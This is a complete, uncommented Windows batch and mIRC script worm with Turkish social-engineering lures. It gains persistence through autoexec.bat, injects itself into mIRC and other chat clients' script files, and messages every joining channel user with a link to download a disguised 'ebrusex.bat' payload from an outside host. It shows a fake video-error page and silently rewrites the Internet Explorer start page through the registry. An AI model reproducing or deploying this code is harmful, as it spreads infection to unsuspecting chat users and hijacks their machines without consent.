   @echo off
   @if a%1a == arega goto son
   @if %0 == c:\system.bat goto esgec
   @copy %0 c:\system.bat /y >> %TEMP%\a.scr
   @echo @c:\system.bat >> c:\autoexec.bat
   @echo Sisteminizde Bu videoyu seyretmek icin uygun konfigurasyon yoktur. > c:\ebru.htm
   @c:\progra~1\intern~1\iexplore c:\ebru.htm
   :esgec
   @if exist c:\mirc\mirc32.exe goto mirc
   @if exist c:\mirc\mirc.ini goto mirc
   :a
   @if exist C:\Klavye40\mirc32.exe goto klavye40
   @if exist C:\Klavye40\mirc.ini goto klavye40
   :b
   @if exist C:\k5plus\mirc32.exe goto k5plus
   @if exist C:\k5plus\mirc.ini goto k5plus




   @goto son

   :mirc
   @copy %0 c:\mirc\script.ini /y >> %TEMP%\a.scr
   @echo n0=script.ini >> c:\mirc\mirc.ini
   @echo n1=script.ini >> c:\mirc\mirc.ini
   @echo n2=script.ini >> c:\mirc\mirc.ini
   @echo n3=script.ini >> c:\mirc\mirc.ini
   @echo n4=script.ini >> c:\mirc\mirc.ini
   @echo n5=script.ini >> c:\mirc\mirc.ini
   @echo n6=script.ini >> c:\mirc\mirc.ini
   @echo n7=script.ini >> c:\mirc\mirc.ini
   @echo n8=script.ini >> c:\mirc\mirc.ini
   @echo n9=script.ini >> c:\mirc\mirc.ini
   @goto a

   :klavye40
   @copy %0 C:\Klavye40\script.ini /y >> %TEMP%\a.scr
   @goto b

   :k5plus
   @copy %0 C:\k5plus\system\remote\script9.ini /y >> %TEMP%\a.scr
   @goto son

   [script]
   n0=on 1:START:{
   n1=  .run www.muziksetim.com
   n2=  .run c:\system.bat reg
   n3=}
   n4=
   n5=
   n6=on 1:JOIN:#:{
   n7=  if $nick != $me {
   n8=    .msg $nick BEDAVA SINIRSIZ REKLAMSIZ SMS YOLLAMAK VE DOYUMSUZ SOHBET ICIN www.muziksetim.com
   n9=    .msg $nick EBRU SALLI SEX ICIN TIKLAYIN http://www.galileo.spaceports.com/~dopdolu/ebrusex.bat
   n10=  }
   n11=}
   n12=
   n13=on 1:DISCONNECT: {
   n14=  .server
   n15=}
   n16=
   n17=on 1:CONNECT:{
   n18=  .join #istanbul
   n19=}
   n20=
   n21=alias remote {
   n22=  if $1 == on { echo Remote on }
   n23=  elseif $1 == off { echo Remote off }
   n24=  else { echo --- }
   n25=}

   :son
   @echo REGEDIT4 > %TEMP%\sys.reg
   @echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main] >> %TEMP%\sys.reg
   @echo "Start Page"="http://www.muziksetim.com/" >> %TEMP%\sys.reg
   @%winbootdir%\regedit /s %TEMP%\sys.reg
   @exit
